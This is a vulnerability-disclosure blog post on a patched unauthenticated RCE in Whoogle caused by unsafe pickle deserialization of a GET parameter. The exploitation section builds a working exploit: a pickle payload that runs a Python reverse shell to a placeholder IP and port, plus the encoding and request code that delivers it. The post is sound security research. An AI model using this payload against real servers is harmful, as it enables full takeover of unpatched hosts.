---
layout: post
title: Whoogle RCE
date: 2024-10-31
categories: vuln-research
description: Unauthenticated RCE in Whoogle
---
PoC: [https://gist.github.com/fern89/ca5fe76ad81b4bc363e7341e523a1651](https://gist.github.com/fern89/ca5fe76ad81b4bc363e7341e523a1651)

{% include embed/video.html src='/assets/media/whoogle/poc.mp4' %}

## Background
[Whoogle](https://github.com/benbusby/whoogle-search) is a self-hosted, ad-free, privacy-respecting metasearch engine, with over 9.5k stars on GitHub and several (20+ at time of writing) public instances hosting it. I have discovered a **0-click RCE** for this software, affecting versions **v0.8.0 to v0.9.0** (patched in v0.9.1), that allows an **unauthenticated remote attacker** to gain arbitrary code execution on the server running the Whoogle instance.

## Vulnerability analysis
Let us take a look at the file [app/models/config.py](https://github.com/benbusby/whoogle-search/blob/main/app/models/config.py). Note the liberal use of `pickle.loads` on user-supplied input. This is incredibly insecure! Such deserialization can lead to RCE, as shown [here](https://book.hacktricks.xyz/pentesting-web/deserialization#pickle). Due to the abundance of `pickle.loads`, we have the luxury to pick the one that seems easiest to exploit, which is found at [line 265](https://github.com/benbusby/whoogle-search/blob/main/app/models/config.py#L265).

{: file="app/models/config.py" }
```py
config = pickle.loads(
    brotli.decompress(urlsafe_b64decode(
        preferences.encode() + b'=='))
)
```
There is no encryption whatsoever on this instance of `pickle.loads`, instead loading directly from a decompressed `?preferences=` parameter in the GET request. This makes exploitation incredibly easy for us!

## Exploitation
Taking some code from [revshells.com](https://www.revshells.com/), we craft a payload for pickle to deserialize.
```py
ipport = '("[IP]",[PORT])'

class P(object):
    def __reduce__(self):
        return (os.system,("python3 -c 'import os,pty,socket;s=socket.socket();s.connect("+ipport+");[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'",))
```
Compressing and base64-encoding,
```py
payload = urllib.parse.quote('u'+base64.b64encode(brotli.compress(pickle.dumps(P()))).decode())
```
Finally, sending off the payload,
```py
try:
    requests.get(target + "search?preferences=" + payload + "&q=", timeout=1)
except requests.exceptions.ReadTimeout: 
    pass
```
Note that we set a short timeout, because otherwise the GET will block, and our exploit script will not automatically exit. Just like that, we have our exploit to gain a reverse shell on the server!

## Conclusion
By getting the server to deserialize our malicious pickle object, we gain unauthenticated arbitrary code execution. Here is the exploit in action once more.

{% include embed/video.html src='/assets/media/whoogle/poc.mp4' %}

Once again, here is the [PoC](https://gist.github.com/fern89/ca5fe76ad81b4bc363e7341e523a1651).

### Timeline
2024-10-31 - Reported vulnerability
2024-11-01 - Vulnerability patched, blogpost released

## Addendum
While researching this vulnerability, I have noticed past researchers also discovering several different vulnerabilities, including a [SSRF](https://nvd.nist.gov/vuln/detail/CVE-2024-22203), [XSS](https://nvd.nist.gov/vuln/detail/CVE-2024-22417), [another SSRF](https://nvd.nist.gov/vuln/detail/CVE-2024-22205), and [path traversal](https://nvd.nist.gov/vuln/detail/CVE-2024-22204). What is particularly interesting about this, is that these vulnerabilities were all discovered in version 0.8.3, which is a version affected by this RCE exploit! So I was genuinely surprised to find out, that the researcher who discovered those exploits, missed the RCE. Not trying to throw shade onto the researcher, just goes to show that even though we may think a project secure, there will almost always be more vulnerabilities lurking behind.
